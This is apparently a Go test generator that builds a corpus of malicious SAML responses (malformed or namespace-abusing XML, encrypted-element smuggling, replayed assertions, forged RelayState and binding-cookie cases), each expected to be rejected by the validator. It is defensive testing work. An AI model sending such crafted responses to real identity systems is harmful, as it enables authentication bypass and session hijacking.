		text("late-xml-declaration", "XML declaration after leading white space", func(s string) string {
			return ` <?xml version="1.0"?>` + s
		}, "processing instruction", "ErrMalformedResponse"),
		text("two-roots", "a second root element", func(s string) string { return s + s }, "more than one root element", "ErrMalformedResponse"),
		text("text-outside-root", "text after the root", func(s string) string { return s + "_evil" },
			"text outside the root element", "ErrMalformedResponse"),
		text("truncated", "truncated document (unclosed elements)", func(s string) string { return s[:len(s)/2] },
			"missing or unclosed root element", "ErrMalformedResponse"),
		text("white-space-only", "a document of white space", func(string) string { return "  \n" },
			"missing or unclosed root element", "ErrMalformedResponse"),
		text("invalid-utf8", "invalid UTF-8 in the NameID", func(s string) string {
			return strings.Replace(s, ">"+nameIDValue+"<", ">alice\xff\xfe<", 1)
		}, "not well-formed XML", "ErrMalformedResponse"),
		text("iso-8859-1-declaration", "declared ISO-8859-1 encoding", func(s string) string {
			return `<?xml version="1.0" encoding="ISO-8859-1"?>` + s
		}, "not well-formed XML", "ErrMalformedResponse"),
		text("utf8-alias-declaration", "declared encoding alias utf8", func(s string) string {
			return `<?xml version="1.0" encoding="utf8"?>` + s
		}, "not well-formed XML", "ErrMalformedResponse"),
		text("us-ascii-declaration", "declared US-ASCII encoding", func(s string) string {
			return `<?xml version="1.0" encoding="us-ascii"?>` + s
		}, "not well-formed XML", "ErrMalformedResponse"),
		text("xml-1.1", "XML 1.1 declaration", func(s string) string { return `<?xml version="1.1"?>` + s },
			"not well-formed XML", "ErrMalformedResponse"),
		{
			id: "xml/utf16", attack: "UTF-16 document with BOM", refs: refs,
			build: func() []byte {
				s := baseXML()
				out := []byte{0xFF, 0xFE}

				for _, r := range s {
					out = append(out, byte(r), byte(r>>8))
				}

				return out
			},
			expect: rejected("ErrMalformedResponse", "not well-formed XML"),
		},
		text("duplicate-attribute", "an attribute repeated with another value", func(s string) string {
			return strings.Replace(s, `InResponseTo=`, `InResponseTo="_evil-request" InResponseTo=`, 1)
		}, twoLocalNames, "ErrMalformedResponse"),
		text("undeclared-prefix", "an element with an undeclared prefix", func(s string) string {
			return strings.Replace(s, "<samlp:Status>", "<evil:Status>", 1)
		}, "undeclared namespace prefix", "ErrMalformedResponse"),
		text("undeclared-attribute-prefix", "an attribute with an undeclared prefix", insertOnRoot(`evil:x="1"`),
			"undeclared namespace prefix", "ErrMalformedResponse"),
		text("xml-prefix-rebound", "the xml prefix rebound", insertOnRoot(`xmlns:xml="urn:evil:attacker.example"`),
			"rebinding of the reserved xml prefix", "ErrMalformedResponse"),
		text("xmlns-prefix-declared", "the xmlns prefix declared", insertOnRoot(`xmlns:xmlns="urn:evil:attacker.example"`),
			"declaration of the reserved xmlns prefix", "ErrMalformedResponse"),
		text("xml-namespace-other-prefix", "the XML namespace bound to another prefix", insertOnRoot(`xmlns:evil="http://www.w3.org/XML/1998/namespace"`),
			"binding of the XML namespace to another prefix", "ErrMalformedResponse"),
		text("xmlns-namespace-bound", "the xmlns namespace bound", insertOnRoot(`xmlns:evil="http://www.w3.org/2000/xmlns/"`),
			"binding of the xmlns namespace", "ErrMalformedResponse"),
		text("empty-prefixed-declaration", "an empty prefixed namespace declaration", insertOnRoot(`xmlns:evil=""`),
			"empty prefixed namespace declaration", "ErrMalformedResponse"),
		text("element-in-reserved-namespace", "an element with the xml prefix", func(s string) string {
			return strings.Replace(s, "<samlp:Status>", "<xml:evil/><samlp:Status>", 1)
		}, "element in a reserved namespace", "ErrMalformedResponse"),
		nsName("attribute-empty-local-part", "an attribute with an empty local part (samlp:) on the Status", `<samlp:Status samlp:="1">`),
		nsName("attribute-empty-prefix", "an attribute with an empty prefix (:x) on the Status", `<samlp:Status :x="1">`),
		nsName("element-empty-prefix", "an element with an empty prefix (<:Foo/>) before the Status", `<:Foo/><samlp:Status>`),
		nsName("element-empty-local-part", "an element with an empty local part (<samlp:/>) before the Status", `<samlp:/><samlp:Status>`),
		nsName("declaration-empty-prefix", "a namespace declaration with an empty prefix (xmlns:) on the Status", `<samlp:Status xmlns:="urn:evil:attacker.example">`),
		text("mismatched-end-tag", "an end tag closing another element", func(s string) string {
			return strings.Replace(s, "</samlp:Status>", "</samlp:Evil>", 1)
		}, "mismatched end tag", "ErrMalformedResponse"),
		text("unbalanced-end-tag", "an extra end tag after the root", func(s string) string { return s + "</samlp:Response>" },
			"unbalanced end tag", "ErrMalformedResponse"),
		text("undeclared-entity", "an undeclared entity reference in the NameID", func(s string) string {
			return strings.Replace(s, ">"+nameIDValue+"<", ">&evil;"+nameIDValue+"<", 1)
		}, "not well-formed XML", "ErrMalformedResponse"),
		{
			id: "xml/bare-assertion-root", attack: "a signed Assertion posted as the whole document", refs: refs,
			build: func() []byte {
				a := sign(g.t, buildAssertion(respParams{requestID: g.txs["acme"].RequestID, issued: t0}), sigOpts{signer: g.keys["idp-a"]})
				doc := etree.NewDocument()
				doc.SetRoot(a)
				s, err := doc.WriteToString()
				require.NoError(g.t, err)

				return []byte(s)
			},
			expect: rejected("ErrMalformedResponse", "root is not a SAML 2.0 Response"),
		},
		text("logout-response-root", "a LogoutResponse root", func(s string) string {
			return strings.ReplaceAll(s, "samlp:Response", "samlp:LogoutResponse")
		}, "root is not a SAML 2.0 Response", "ErrMalformedResponse"),
		text("saml11-protocol-root", "the Response in the SAML 1.1 protocol namespace", func(s string) string {
			return strings.Replace(s, `xmlns:samlp="`+nsP+`"`, `xmlns:samlp="urn:oasis:names:tc:SAML:1.0:protocol"`, 1)
		}, "root is not a SAML 2.0 Response", "ErrMalformedResponse"),
	}
}

func (g *corpusGen) encryptionSpecs() []corpusSpec {
	refs := []string{"#88 binding decision: EncryptedAssertion refused", "SAML errata E93"}
	encryptedIn := func(local string) func(parent *etree.Element) {
		return func(parent *etree.Element) {
			el := parent.CreateElement("saml:" + local)
			el.CreateElement("xenc:EncryptedData").CreateAttr("xmlns:xenc", nsXENC)
		}
	}

	return []corpusSpec{
		{
			id: "encryption/encrypted-assertion", attack: "EncryptedAssertion next to the signed assertion", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) { encryptedIn("EncryptedAssertion")(r) }}))
			},
			expect: rejected("ErrEncryptedAssertionUnsupported", ""),
		},
		{
			id: "encryption/encrypted-assertion-only", attack: "EncryptedAssertion in place of the assertion", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					r.RemoveChild(child(r, "Assertion"))
					encryptedIn("EncryptedAssertion")(r)
				}}))
			},
			expect: rejected("ErrEncryptedAssertionUnsupported", ""),
		},
		{
			id: "encryption/encrypted-id", attack: "EncryptedID in the signed Subject", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) { encryptedIn("EncryptedID")(path(a, "Subject")) })))
			},
			expect: rejected("ErrEncryptedAssertionUnsupported", ""),
		},
		{
			id: "encryption/encrypted-attribute", attack: "EncryptedAttribute in a signed AttributeStatement", refs: refs,
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) { encryptedIn("EncryptedAttribute")(path(a, "AttributeStatement")) }))
			},
			expect: rejected("ErrEncryptedAssertionUnsupported", ""),
		},
		{
			id: "encryption/encrypted-key-anywhere", attack: "a stray xenc:EncryptedKey in the Response", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					ek := r.CreateElement("x:EncryptedKey")
					ek.CreateAttr("xmlns:x", nsXENC)
				}}))
			},
			expect: rejected("ErrEncryptedAssertionUnsupported", ""),
		},
		{
			id: "encryption/xenc11-element", attack: "an XML Encryption 1.1 element", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					el := r.CreateElement("x:ConcatKDFParams")
					el.CreateAttr("xmlns:x", "http://www.w3.org/2009/xmlenc11#")
				}}))
			},
			expect: rejected("ErrEncryptedAssertionUnsupported", ""),
		},
	}
}

func (g *corpusGen) limitSpecs() []corpusSpec {
	return append(g.cappedLimitSpecs(), g.encodingLimitSpecs()...)
}

func (g *corpusGen) replaySpecs() []corpusSpec {
	baseline := func() []byte { return g.xml("acme", respOpts{}) }
	refs := []string{"SAML Profiles §4.1.4.5", "SAML errata E90"}

	return []corpusSpec{
		{
			id: "replay/assertion-already-consumed", attack: "assertion ID already in the replay cache (re-issued or replayed assertion)",
			refs: refs, knobs: corpusKnobs{PreMarked: &corpusReplayKey{Issuer: idpEntity, AssertionID: assertionID}},
			build: baseline, file: "baseline/assertion-signed.xml",
			expect: corpusExpect{Outcome: outcomeRejected, Sentinel: "ErrAssertionReplayed", Consumed: true},
		},
		{
			id: "replay/without-relay-state", attack: "IdP-initiated style POST without RelayState", refs: append(refs, "SAML Profiles §4.1.5"),
			knobs: corpusKnobs{RelayState: "none"}, build: baseline, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrUnsolicitedResponse", "RelayState is not a handle issued by BeginLogin"),
		},
		{
			id: "replay/relay-state-url", attack: "RelayState carrying an attacker URL (open-redirect style)", refs: refs,
			knobs: corpusKnobs{RelayState: "url"}, build: baseline, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrUnsolicitedResponse", "RelayState is not a handle issued by BeginLogin"),
		},
		{
			id: "replay/relay-state-of-no-transaction", attack: "well-formed RelayState handle never issued", refs: refs,
			knobs: corpusKnobs{RelayState: "other"}, build: baseline, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrTransactionNotFound", ""),
		},
		{
			id: "replay/without-binding-cookie", attack: "posted without the browser-binding cookie (other browser, Lax-only design)", refs: refs,
			knobs: corpusKnobs{Cookie: "none"}, build: baseline, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrMissingBrowserBinding", ""),
		},
		{
			id: "replay/malformed-binding-cookie", attack: "a binding cookie that is not a handle", refs: refs,
			knobs: corpusKnobs{Cookie: "malformed"}, build: baseline, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrMissingBrowserBinding", ""),
		},
		{
			id: "replay/idp-metadata-expired", attack: "the IdP metadata expired between the two legs (Metadata §4.3.2, errata E94)",
			refs: []string{"SAML Metadata §4.3.2", "SAML errata E94"}, knobs: corpusKnobs{MetadataExpired: true},
			build: baseline, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrMetadataExpired", ""),
		},
		{
			id: "replay/other-browser", attack: "posted by another browser's binding cookie (login CSRF)", refs: refs,
			knobs: corpusKnobs{Cookie: "other"}, build: baseline, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrBrowserBindingMismatch", ""),
		},
	}
}
